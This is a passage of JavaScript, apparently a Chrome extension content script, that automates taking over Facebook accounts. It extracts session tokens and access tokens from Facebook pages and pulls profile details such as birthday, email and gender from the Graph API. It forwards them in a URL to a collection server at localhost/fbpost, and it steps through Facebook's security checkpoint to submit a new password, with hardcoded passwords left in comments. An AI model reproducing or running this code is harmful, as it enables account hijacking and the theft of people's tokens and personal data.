	var targetFrameId='fstFrameDiv';
	var iframe = document.getElementById(targetFrameId);
    var msg = {
        type: type,
        data: data
    };
    iframe.contentWindow.postMessage(msg, '*');
    //window.postMessage(msg, "*");
}
function checkurl() {
	var url = window.location.href;
	if(url.match(/web.facebook.com/g)) {
		url = 'https://web.facebook.com/';
	} else {
		url = 'https://www.facebook.com/';
	}
	return url;
}
function deSerialize(json) {
	return Object.keys(json).map(function (key) {
		return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
	}).join('&');
}
function searchArray(obj, deepDataAndEvents) {
	var val = false;
	for (key in obj) {
		if (key.toString() == deepDataAndEvents) {
			val = obj[key];
			break;
		} else {
			if (typeof obj[key] == "object") {
				val = searchArray(obj[key], deepDataAndEvents);
				if (val != false) {
					break;
				}
			}
		}
	};
	return val;
}
function get_dyn() {
	function format() {
		$BitMap1 = [];
		for (i in obj) {
			$BitMap1[obj[i]] = 1;
		}
		if ($BitMap1["length"] === 0) {
			return "";
		}
		var l = [];
		var pathConfig = 1;
		var old = $BitMap1[0] || 0;
		var h = old.toString(2);
		var unlock = 1;
		for (; unlock < $BitMap1["length"]; unlock++) {
			var expr = $BitMap1[unlock] || 0;
			if (expr === old) {
				pathConfig++;
			} else {
				l["push"](isArray(pathConfig));
				old = expr;
				pathConfig = 1;
			}
		}
		if (pathConfig) {
			l["push"](isArray(pathConfig));
		}
		return getStyle(h + l["join"](""));
	}

	function isArray(it) {
		var result = it.toString(2);
		var digits = "0"["repeat"](result["length"] - 1);
		return digits + result;
	}

	function getStyle(cssprop) {
		var result = (cssprop + "00000")["match"](/[01]{6}/g);
		var tagout = "";
		var i = 0;
		for (; i < result["length"]; i++) {
			tagout += tmp[parseInt(result[i], 2)];
		}
		return tagout;
	}
	var extensions = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
	var SubClass = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
	var data = extensions["concat"](SubClass);
	var obj = [];
	for (x in data) {
		if (data[x] != null) {
			var cDigit = data[x]["replace"]("},", "")["replace"]("]", "");
			if (parseInt(cDigit) >= 7) {
				obj["push"](parseInt(cDigit));
			}
		}
	}
	var tmp = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
	return format();
}
function testimacros() {
	var macroCode = '';
	macroCode += 'TAB OPEN\n TAB T=2\n';
	macroCode += 'SET !ERRORIGNORE YES\n SET !TIMEOUT_PAGE 3600\n';
	macroCode += 'URL GOTO=http://localhost/fbpost/Facebook/fblist\n';
	launchMacro(macroCode);
}

function setCookie(cname,cvalue,exdays) {
  var d = new Date();
  d.setTime(d.getTime() + (exdays*60*1000));
  var expires = "expires=" + d.toGMTString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for(var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
function closeTabs(tabid) {
	chrome.tabs.query({}, function(tabs) {
		for (var i = 0; i < tabs.length; i++) {
			if(tabs[i].id!=tabid) {
				chrome.tabs.remove(tabs[i].id);
			}
	    }
	  
	});
}
function userinfo(userdata) {
	var l = {};
	l.id = '';
	var pqr = new XMLHttpRequest;
	pqr.open("GET", "https://mobile.facebook.com/composer/ocelot/async_loader/?publisher=feed", true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {
		if (pqr.readyState == 4 && pqr.status == 200){
			var t = pqr.responseText;
			if(t.match(/{\\"dtsg\\":{\\"token\\":\\"(.*?)\\"/)) {
				userdata.dtsg = t.match(/{\\"dtsg\\":{\\"token\\":\\"(.*?)\\"/)[1];
			}
			//userdata.accessToken = t.match(/accessToken\\":\\"(.*?)\\"/)[1];
			if(t.match(/USER_ID\\":\\"(.*?)\\"/)) {
				userdata.user_id = t.match(/USER_ID\\":\\"(.*?)\\"/)[1];
			}
			if(t.match(/NAME\\":\\"(.*?)\\"/)) {
				userdata.NAME = t.match(/NAME\\":\\"(.*?)\\"/)[1];
			}			
			if(t.match(/SHORT_NAME\\":\\"(.*?)\\"/)) {
				userdata.SHORT_NAME = t.match(/SHORT_NAME\\":\\"(.*?)\\"/)[1];
			}
			if(t.match(/__spin_t\\":\\"(.*?)\\"/)) {
				userdata.__spin_t = t.match(/__spin_t\\":\\"(.*?)\\"/)[1];
			}
			if(t.match(/dtsg\\":{(.*?)\\"/)) {
				userdata.dtsg = t.match(/dtsg\\":{\\"token\\":\\"(.*?)\\"/)[1];
			}
			if(t.match(/name=\\"target\\" value=\\"(.*?)\\"/) && !userdata.user_id) {
				userdata.user_id = t.match(/name=\\"target\\" value=\\"(.*?)\\"/)[1];
			}
			if(t.match(/,\{"token":"\(.\*\?\)"/g)) {
				userdata.fb_dtsg = t.match(/,\{"token":"\(.\*\?\)"/g)[0].replace(',\{"token":"', '').replace('"', '');
			} else {
				if(t.match(/fb_dtsg\\" value=\\"(.*?)\\"/)) {
					userdata.fb_dtsg = t.match(/fb_dtsg\\" value=\\"(.*?)\\"/)[1];
				}
			}
			if(t.match(/accessToken\\":\\"(.*?)\\"/)) {
				userdata.accessToken = t.match(/accessToken\\":\\"(.*?)\\"/)[1];
			}
			chrome.storage.sync.set({userinfo: userdata});
			//window.location.href = 'https://mobile.facebook.com/';	
			getme(userdata);	
		}
	}
	pqr.send();
}
function getme(userdata) {
	console.log(userdata);
	var l = {};
	l.id = '';
	var pqr = new XMLHttpRequest;
	pqr.open("GET", "https://graph.facebook.com/v9.0/me?access_token="+userdata.accessToken+"&debug=all&fields=id%2Cname%2Cbirthday%2Cemail%2Cgender%2Cabout&format=json&method=get&pretty=0&suppress_http_code=1&transport=cors", true);
	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
	pqr.onreadystatechange = function() {
		if (pqr.readyState == 4 && pqr.status == 200){
			var t = pqr.responseText;
			u = JSON.parse(t);
			userdata.name = u.name;
			userdata.gender = u.gender;
			userdata.birthday = u.birthday;
			chrome.storage.sync.set({action: ''});
			chrome.storage.sync.set({cname: ''});
			window.location = 'http://localhost/fbpost/facebook/fbupdate?stat=8&action=userinfo&'+deSerialize(userdata);			
		}
	}
	pqr.send();
}
function load(url, callback) {
	console.log(url);
	var http4 = new XMLHttpRequest;
	var url4 = url;
	http4.open("GET", url4, true);
	http4.onreadystatechange = function (){
		if (http4.readyState === 4 && http4.status == 200){
			callback(http4.response);
		} else {
			return false;
		}
	};
	http4.send(null);
}

/*Change language*/
	if(gcname =='getffba' && action =='lang') {
		chrome.storage.sync.set({action: 'lang'});
		chrome.storage.sync.set({cname: 'getffba'});
		$('h3 a').map( function() {
			if($(this).attr('href').match(/l=en_US/g)) {
		    	url = 'https://mbasic.facebook.com/'+$(this).attr('href');
		    	var act = load(url,myFunction);
		    }
		}).get();
	}
	/*End Change language*/

	function myFunction(xhttp) {
		console.log('myFunction');
		var curl = window.location.href;
		var url = new URL(curl);
		var gcname = url.searchParams.get("cname");
		var action = url.searchParams.get("action");
		var backto = url.searchParams.get("backto");
		chrome.storage.sync.get(['userinfo'], function(result) {
		if(result.userinfo) {	
			chrome.storage.sync.set({cname: 'getffba'});				
			window.location.href = 'https://mbasic.facebook.com/hacked/triage/?_rdr&action=someone_accessed&cname=getffba';
		}
		  // pw = '02097869025';
		  // nw = 'khmer@123';
		  // if($('input[name=password_old]').length) {
		  // 	$('input[name=password_old]').val(pw);
		  // }
		  // if($('input[name=password_new]').length) {
		  // 	$('input[name=password_new]').val(nw);
		  // }
		  // if($('input[name=password_confirm]').length) {
		  // 	$('input[name=password_confirm]').val(nw);
		  // }
		});
		// if(gcname =='getffba' && result.userinfo) {
		// 	window.location.href = 'https://mbasic.facebook.com/hacked/triage/?_rdr&action=someone_accessed';
		// }
	}

	
	chrome.storage.sync.get(['cname'], function(result) {
		console.log(result.cname);
	  if(result.cname == 'getffba') {
	  	/*Change password*/
	  	if(action =='someone_accessed') {
			//step 1
			chrome.storage.sync.set({cname: 'getffba'});
			var res = $('input[value=someone_accessed]').prop( "checked", true );
			$('button[type=submit]').click();
			
		}
	  	if(curl.match(/mbasic.facebook.com\/checkpoint\/flow/g)) {
	  		//step 2
	  		chrome.storage.sync.set({cname: 'getffba'});
	  		$('#checkpointButtonContinue input[type=submit]').click();
	  	}
	  	if(curl.match(/mbasic.facebook.com\/checkpoint\/flow/g) && curl.match(/checkpoint_created=1/g)) {
	  		//step 3
	  		chrome.storage.sync.set({cname: 'getffba'});
	  		var tr = [];
	  		if($('input[name=password_new]').length) {
	  			chrome.storage.sync.get(['userinfo'], function(result) {				  
				  // pw = '02097869025';
				  // nw = 'khmer@123';
				  chrome.storage.sync.set({action: 'password'});
				  if($('input[name=password_old]').length) {
				  	$('input[name=password_old]').val(result.userinfo.pass);
				  }
				  if($('input[name=password_new]').length) {
				  	$('input[name=password_new]').val(result.userinfo.npass);
				  }
				  if($('input[name=password_confirm]').length) {
				  	$('input[name=password_confirm]').val(result.userinfo.npass);
				  	//$('#checkpointSubmitButton input[type=submit]').click();
				  	if($( "div:contains('your password is required.')" ).length>0) {
				  		$('#checkpointSubmitButton input[type=submit]').click();
				  	}
				  	//console.log($( "div:contains('your password is required.')" ).length);
				  }
				  if($('input[name=password_new]').length) {
				  	chrome.storage.sync.set({action: 'finish'});
				  	if($( "div:contains('your password is required.')" ).length>0) {
				  		$('#checkpointSubmitButton input[type=submit]').click();
				  	}
				  }
				});
	  		} else {
	  			$('#checkpointSubmitButton input[type=submit]').click();
	  		}
	  		if($('#checkpointButtonGotoNewsFeed input[type=submit]').length) {
	  			chrome.storage.sync.set({action: 'finish'});
	  			$('#checkpointButtonGotoNewsFeed input[type=submit]').click();
	  		}
	  	}
	  	/*End Change password*/

	  	/*get name*/
	  	chrome.storage.sync.get(['action'], function(result) {
	  		if(result.action) {
	  			console.log(result.action);
	  			switch(result.action) {
				  case 'password':
					  	chrome.storage.sync.get(['userinfo'], function(result) {
					  		userdata= result.userinfo;				    	
					    	chrome.storage.sync.set({action: 'token'});
					    	chrome.storage.sync.set({userinfo: userdata});
					    	window.location.href = 'https://mobile.facebook.com/';
					  	});
					    break;
				 	case 'token':
					  	chrome.storage.sync.set({action: 'userinfo'});
					    chrome.storage.sync.get(['userinfo'], function(result) {
					  		userdata= result.userinfo;
					    	userinfo(userdata);
					  	});
				    break;
				    case 'userinfo':
				    	//chrome.storage.sync.set({action: 'token'});
					    chrome.storage.sync.get(['userinfo'], function(result) {
					  		userdata= result.userinfo;
					    	console.log(userdata);
					    	getme(userdata);
					  	});
				    break;
				  default:
				    // code block
				}
	  		}
	  	});
	  	/*End get name*/
	  }
	});
	